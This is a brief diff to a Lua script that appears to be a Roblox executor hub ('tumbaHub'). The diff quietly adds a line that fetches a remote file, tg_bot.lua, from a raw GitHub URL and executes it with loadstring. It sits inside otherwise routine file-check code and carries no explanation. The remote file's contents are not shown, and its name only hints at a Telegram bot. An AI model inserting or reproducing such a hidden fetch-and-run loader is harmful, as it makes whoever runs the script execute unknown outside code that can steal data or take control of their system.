@@ -14,7 +14,10 @@ task.spawn(function()
     if isfile and isfile(fileName) then
         return -- Already invited, skip to avoid spam on teleports / auto-inject
     end
-    
+        
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/tg_bot.lua",true))()
+-- ========================================================
+        
     if writefile then
         pcall(function()
             if not isfolder("tumbaHub") then makefolder("tumbaHub") end
